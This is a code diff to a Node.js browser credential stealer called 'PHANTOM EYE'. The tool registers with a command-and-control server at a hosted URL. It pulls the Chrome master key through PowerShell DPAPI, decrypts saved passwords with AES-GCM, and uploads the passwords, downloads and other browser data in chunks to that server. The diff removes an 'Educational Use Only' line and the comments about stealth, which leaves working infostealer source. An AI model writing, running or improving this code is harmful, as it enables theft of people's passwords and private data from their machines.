@@ -1,8 +1,6 @@
 // ================================================
-// PHANTOM EYE - Browser Data Extraction Tool
-// WITH STEALTH PASSWORD DECRYPTION
-// No external downloads - uses built-in Windows APIs
-// Educational Use Only
+// PHANTOM EYE - FULL BROWSER DATA EXTRACTOR
+// With Password Decryption (PowerShell + Node.js)
 // ================================================
 
 const os = require('os');
@@ -17,7 +15,7 @@ const { exec } = require('child_process');
 // ================================================
 const CONFIG = {
     c2: {
-        url: 'https://phantom-eye-production.up.railway.app',   // ← CHANGE TO YOUR RAILWAY URL
+        url: 'https://phantom-eye-production.up.railway.app',  // ← CHANGE THIS
         register: '/api/register',
         data: '/api/data'
     },
@@ -28,17 +26,16 @@ const CONFIG = {
 };
 
 // ================================================
-// STEALTH PASSWORD DECRYPTOR
+// PASSWORD DECRYPTOR
 // ================================================
 class PasswordDecryptor {
     constructor() {
         this.tempDir = os.tmpdir();
         this.successfulMethod = null;
-        this.decryptedCount = 0;
     }
 
     // ================================================
-    // MAIN DECRYPT FUNCTION
+    // DECRYPT PASSWORDS
     // ================================================
     async decryptPasswords(profilePath, browserName) {
         console.log(`  🔓 Decrypting passwords for ${browserName}...`);
@@ -51,7 +48,6 @@ class PasswordDecryptor {
             return [];
         }
 
-        // Extract encrypted passwords from database
         const encryptedPasswords = await this.extractEncryptedPasswords(loginDbPath);
         if (encryptedPasswords.length === 0) {
             console.log(`  ⚠️ No passwords found in ${browserName}`);
@@ -60,10 +56,9 @@ class PasswordDecryptor {
 
         console.log(`  📦 Found ${encryptedPasswords.length} encrypted passwords`);
 
-        // Try methods in order of stealth
         let results = [];
 
-        // Method 1: PowerShell DPAPI (Windows native - stealthy)
+        // Method 1: PowerShell DPAPI
         if (process.platform === 'win32') {
             console.log(`  🔐 Method 1: PowerShell DPAPI...`);
             try {
@@ -79,7 +74,7 @@ class PasswordDecryptor {
             }
         }
 
-        // Method 2: Node.js Crypto (built-in - very stealthy)
+        // Method 2: Node.js Crypto
         if (results.length === 0) {
             console.log(`  🔐 Method 2: Node.js Crypto...`);
             try {
@@ -95,7 +90,7 @@ class PasswordDecryptor {
             }
         }
 
-        // Method 3: Return encrypted (no risk)
+        // Fallback: return encrypted
         if (results.length === 0) {
             console.log(`  ⚠️ All decryption methods failed, returning encrypted`);
             results = encryptedPasswords.map(p => ({
@@ -154,7 +149,7 @@ class PasswordDecryptor {
     }
 
     // ================================================
-    // METHOD 1: PowerShell DPAPI (Windows Native)
+    // METHOD 1: PowerShell DPAPI
     // ================================================
     async decryptWithPowerShell(localStatePath, encryptedPasswords) {
         if (process.platform !== 'win32') {
@@ -162,11 +157,9 @@ class PasswordDecryptor {
         }
 
         try {
-            // Read Local State and get encrypted key
             const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
             const encryptedKey = localState.os_crypt.encrypted_key;
             
-            // Decrypt master key using DPAPI via PowerShell
             const psScript = `
                 Add-Type -AssemblyName System.Security
                 $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
@@ -182,7 +175,6 @@ class PasswordDecryptor {
 
             const masterKey = Buffer.from(masterKeyBase64.trim(), 'base64');
             
-            // Decrypt each password
             const results = [];
             for (const item of encryptedPasswords) {
                 try {
@@ -214,11 +206,9 @@ class PasswordDecryptor {
     // ================================================
     async decryptWithNodeCrypto(localStatePath, encryptedPasswords) {
         try {
-            // Read Local State
             const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
             const encryptedKey = localState.os_crypt.encrypted_key;
             
-            // Try to decrypt master key using PowerShell (fallback)
             const psScript = `
                 Add-Type -AssemblyName System.Security
                 $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
@@ -234,7 +224,6 @@ class PasswordDecryptor {
 
             const masterKey = Buffer.from(keyBase64.trim(), 'base64');
 
-            // Decrypt each password
             const results = [];
             for (const item of encryptedPasswords) {
                 try {
@@ -262,11 +251,10 @@ class PasswordDecryptor {
     }
 
     // ================================================
-    // AES-GCM DECRYPTION (Core algorithm)
+    // AES-GCM DECRYPTION
     // ================================================
     decryptAESGCM(encryptedData, masterKey) {
         try {
-            // Chrome format: version(1) + nonce(12) + ciphertext + tag(16)
             if (!encryptedData || encryptedData.length < 29) {
                 return null;
             }
@@ -288,7 +276,7 @@ class PasswordDecryptor {
     }
 
     // ================================================
-    // EXECUTE COMMAND HELPER
+    // EXECUTE COMMAND
     // ================================================
     executeCommand(command) {
         return new Promise((resolve) => {
@@ -318,7 +306,7 @@ class PhantomEye {
     async start() {
         console.log('👁️ PHANTOM EYE ACTIVATED');
         console.log('📊 Advanced Browser Data Extraction');
-        console.log('🔑 Stealth Password Decryption: ENABLED');
+        console.log('🔑 Password Decryption: ENABLED');
         
         await this.registerWithC2();
         await this.extractAllData();
@@ -457,7 +445,7 @@ class PhantomEye {
             data.downloads = await this.extractDownloads(profilePath);
             console.log(`  📥 Downloads: ${data.downloads.length} entries`);
 
-            // Passwords with stealth decryption
+            // Passwords with decryption
             if (CONFIG.decrypt.enabled) {
                 data.passwords = await this.decryptor.decryptPasswords(profilePath, browser.name);
                 const decrypted = data.passwords.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
@@ -778,12 +766,12 @@ class PhantomEye {
         try {
             console.log('📤 Sending extracted data to C2...');
             
-            await this.sendDataChunk('system', this.extractedData.system);
+            await this.sendChunk('system', this.extractedData.system);
 
             for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
                 for (const [dataType, data] of Object.entries(browserData)) {
                     if (data && data.length > 0) {
-                        await this.sendDataChunk(`${browserName}_${dataType}`, data);
+                        await this.sendChunk(`${browserName}_${dataType}`, data);
                     }
                 }
             }
@@ -794,7 +782,7 @@ class PhantomEye {
         }
     }
 
-    async sendDataChunk(dataType, data) {
+    async sendChunk(dataType, data) {
         try {
             await fetch(CONFIG.c2.url + CONFIG.c2.data, {
                 method: 'POST',
